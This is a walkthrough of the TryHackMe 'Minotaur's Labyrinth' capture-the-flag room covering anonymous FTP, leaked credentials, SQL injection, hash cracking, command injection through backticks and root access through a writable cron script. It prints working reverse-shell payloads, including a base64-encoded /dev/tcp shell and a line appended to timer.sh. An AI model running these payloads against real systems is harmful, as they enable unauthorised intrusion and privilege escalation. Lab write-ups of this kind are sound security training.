[Minotaur's Labyrinth](https://tryhackme.com/room/labyrinth8llv) is another vulnerable web application with a built-in web shell for gaining user access. The labyrinth theme keeps things interesting and you have to find a privileged user by cracking some passwords before you can access the web shell. There are also a pair of flags hidden along the way which give this box a CTF feel. Overall, it was enjoyable challenge. Let's get started on how to solve it.

> 🔔 Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.

# Initial Enumeration

# First Flag

FTP is open and `nmap`'s `ftp-anon` script indicates anonymous logins are allowed. Let's start there. FTP to minotaur with the username anonymous and no password.

```console
$ ftp minotaur
Connected to minotaur.
220 ProFTPD Server (ProFTPD) [::ffff:10.10.88.99]

Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Once we are logged in, there is a `pub` directory available. Be sure to use `ls -al` to list files so you can see the `.secret` directory inside `pub`.

```
ftp> ls -al

Inside the `.secret` folder is the flag! Use the `get` command to download it.

```
ftp> cd .secret

# Leaked Credentials

HTTP and HTTPS are also open.  Let's see what the browser renders.

![](/assets/img/20220114134257.png)

It's a simple login page. We could try brute forcing it, but lets see if there are any other publicly accessible pages.

I had some horrible network latency again with TryHackMe's VPN. I eventually got feroxbuster to show me a _logs_ directory. Apache is configured to display the directory contents, so we can easily traverse to a log file:

_http://minotaur/logs/post/post_log.log_
```text

```

It's a captured HTTP request with a username and password. Trying the credentials successfully logs us into the site.

# Dumping and Cracking Hashes

There's a search form that lets us query People or Creatures. Trying a typical SQL injection payload works immediately and gets us a complete list of users and password hashes.

![](/assets/img/20220114135843.png)

Let's use [hashcat](https://hashcat.net/hashcat/) and the [rockyou](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz) password list to see if we can crack any of them.

```console
hashcat -m0 -a0 people /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.1.1) starting...
...
42354020b68c7ed28dcdeabd5a2baf8e:REDACTED

Hash.Target......: people
...
```

Four out of five isn't bad! And the one we didn't crack was the one we found in the log file anyway.

Let's change the query table to Creatures and run our SQLi payload again; four more hashes are appended to the page. Let's crack those too.

```console
hashcat -m0 -a0 creatures /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

```

# Second Flag

With all of the hashes cracked, we can authenticate as each user and see if any of them have elevated privileges. Sure enough, when we log in as M!notaur there's a flag in the menu and an extra link to "Secret_Stuff".

![](/assets/img/20220114142110.png)

# Exploiting the Echo Panel

The "Secret_Stuff" page is just an "echo" tool. Whatever you type into the form gets echoed onto the page. It appears there is a filter because some commands and characters print a sort of error message to the page instead of the submitted value:

_You really think this is gonna be possible i fixed this @Deadalus -\_- !!!?_

Fortunately one crucial character is not restricted and we can execute commands by enclosing them in backticks (```). Using the `cat` command, we can see the filter being applied in `echo.php`.

```php
preg_match('/[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/', $search)
```

This makes crafting a bypass much easier than guessing. We can create a bash reverse shell by base64 encoding it.

`base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEg | /bin/bash`

Be sure to add spaces to your reverse shell command until the encoded output has no trailing `=`; since it's a restricted character. Set up a listener and then submit the payload (wrapped in backticks) and we should have a successful reverse shell.

```console
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.6.125.202] from (UNKNOWN) [10.10.240.244] 44298
bash: cannot set terminal process group (744): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
daemon@labyrinth:/opt/lampp/htdocs$ 
```

## User flag
Finding the user flag is straightforward. It's in the "user" home directory which is accessible to the _daemon_ user that we've just obtained access as.

```console
daemon@labyrinth:/opt/lampp/htdocs$ cd /home
cd /home
daemon@labyrinth:/home$ ls -al
ls -al
total 20
drwxr-xr-x  5 root     root     4096 jún   18  2021 .

-rw-r--r-- 1 daemon daemon   29 jún   15  2021 flag.txt
daemon@labyrinth:/home/user$ cat flag.txt
cat flag.txt
REDACTED
```

On to the root flag.

## Root flag
Listing everything under the root mount, you can see there's an unusual directory called `timers`.

```console
daemon@labyrinth:/$ ls -al
ls -al
total 728648

daemon@labyrinth:/$ 
```

Inside we find a timer shell script with 777 file permissions.

```console
daemon@labyrinth:/$ cd timers
daemon@labyrinth:/timers$ ls -al
total 12
drwxrwxrwx  2 root root 4096 jún   15  2021 .
drwxr-xr-x 26 root root 4096 nov    9 13:37 ..
-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
```

It's a simple script that echoes some text to a file. I suspect this script is executed by a root cron job. Let's set up a second netcat listener on port `4445` and add a reverse shell command to the script.

```console
$ nc -nvlp 4445
listening on [any] 4445 ...
```

```
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
daemon@labyrinth:/timers$ 
daemon@labyrinth:/timers$ echo "/bin/bash -i >& /dev/tcp/10.6.125.202/4445 0>&1" >> timer.sh
```

After about a minute, the shell connects and we have root access!

```console
$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.6.125.202] from (UNKNOWN) [10.10.88.99] 52728
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

The last thing to do is collect the flag.

```
# cat da_king_flek.txt
REDACTED
```
